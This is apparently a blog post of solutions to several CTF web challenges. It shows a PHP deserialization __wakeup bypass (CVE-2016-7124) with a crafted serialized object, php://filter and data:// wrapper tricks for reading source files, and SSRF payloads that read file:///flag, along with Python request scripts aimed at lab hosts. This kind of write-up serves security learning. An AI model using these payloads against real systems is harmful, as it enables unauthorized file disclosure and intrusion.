---
title: Web做题1
date: 2023-12-03 21:09:13
tags: Web
mathjax: true
---

# Web做题1

## [SWPUCTF 2021 新生赛]no_wakeup

反序列化时触发`__wakeup`函数，考虑绕开。

```php
$aa = new HaHaHa();
$aa->admin = "admin";
$aa->passwd = "wllm";
$stus = serialize($aa);
print_r($stus); //O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

CVE-2016-7124：当参数列表中成员个数与实际不符时绕过`__wakeup`函数，构造：

```
O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

payload：

```python
import requests
response=requests.get('http://node4.anna.nssctf.cn:28398/class.php?p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}')
print(response.text[-44:])
```

## [LitCTF 2023]我Flag呢？

略。

## [SWPUCTF 2021 新生赛]PseudoProtocols

hint.php读取方法：

```
?wllm=php://filter/read=convert.base64-encode/resource=hint.php
```

以文件形式读取：

```
?a=data://text/plain,I want flag
```

exp:

```python
import requests,base64
response1=requests.get('http://node4.anna.nssctf.cn:28518/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php')
tmp1=response1.text[-56:]
tmp2=base64.b64decode(tmp1.encode())
# print(tmp2)

response2=requests.get('http://node4.anna.nssctf.cn:28518/test2222222222222.php?a=data://text/plain,I want flag')
print(response2.text[-44:])
```

## [NISACTF 2022]easyssrf

SSRF，尝试访问：

```
file:///flag
```

访问：

```
file:///fl4g
```

访问：

```
http://node5.anna.nssctf.cn:28734/ha1x1ux1u.php
```

php伪协议：

```
http://node5.anna.nssctf.cn:28734/ha1x1ux1u.php?file=php://filter/read=convert.base64-encode/resource=/flag
```

